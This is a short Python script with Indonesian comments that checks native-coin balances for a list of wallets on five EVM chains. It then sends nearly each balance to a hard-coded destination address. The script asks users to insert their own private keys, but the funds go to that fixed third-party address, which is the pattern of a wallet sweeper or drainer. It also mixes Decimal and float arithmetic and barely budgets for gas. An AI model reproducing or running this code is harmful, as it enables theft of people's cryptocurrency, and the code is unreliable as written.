from web3 import Web3
from eth_account import Account
import json

# 🔹 Daftar RPC & Jaringan
CHAINS = {
    "Ethereum": {"rpc": "https://rpc.ankr.com/eth", "chain_id": 1, "native_symbol": "ETH"},
    "BSC": {"rpc": "https://rpc.ankr.com/bsc", "chain_id": 56, "native_symbol": "BNB"},
    "Polygon": {"rpc": "https://rpc.ankr.com/polygon", "chain_id": 137, "native_symbol": "MATIC"},
    "Avalanche": {"rpc": "https://rpc.ankr.com/avalanche", "chain_id": 43114, "native_symbol": "AVAX"},
    "Fantom": {"rpc": "https://rpc.ankr.com/fantom", "chain_id": 250, "native_symbol": "FTM"},
}

# 🔹 Alamat tujuan untuk setiap jaringan EVM
TARGET_ADDRESS = "0x25fa9C6d6bc937d415aD2Bc13F0ca2c01F6E1037"

# 🔹 Fungsi untuk Cek & Kirim di Jaringan EVM
def connect_chain(chain_name):
    return Web3(Web3.HTTPProvider(CHAINS[chain_name]["rpc"]))

def get_balance(web3, address):
    balance = web3.eth.get_balance(address)
    return web3.from_wei(balance, 'ether')

def send_native_coin(web3, private_key, amount, chain_name):
    try:
        account = Account.from_key(private_key)
        nonce = web3.eth.get_transaction_count(account.address)
        gas_price = web3.eth.gas_price
        value = web3.to_wei(amount, 'ether')

        tx = {
            'nonce': nonce,
            'to': TARGET_ADDRESS,
            'value': value,
            'gas': 21000,
            'gasPrice': gas_price,
            'chainId': CHAINS[chain_name]["chain_id"]
        }

        signed_tx = web3.eth.account.sign_transaction(tx, private_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(f"✅ {CHAINS[chain_name]['native_symbol']} Sent: {web3.to_hex(tx_hash)}")
    except Exception as e:
        print(f"⚠️ {CHAINS[chain_name]['native_symbol']} send failed: {e}")

# 🔹 Cek Saldo & Kirim Jika Ada
def process_wallets(wallets):
    for wallet in wallets:
        print(f"🔍 Checking Wallet: {wallet['address']}")

        # Cek & Kirim di Jaringan EVM
        for chain in CHAINS.keys():
            web3 = connect_chain(chain)
            balance = get_balance(web3, wallet["address"])
            print(f"💰 {chain}: {balance} {CHAINS[chain]['native_symbol']}")

            if balance > 0.01:  # Kirim jika ada saldo
                send_native_coin(web3, wallet["private_key"], balance - 0.001, chain)

# 🔹 Jalankan untuk 10 Wallet
wallets = [{"address": "0x...", "private_key": "0x..."}]  # Ganti dengan wallet kamu
process_wallets(wallets)
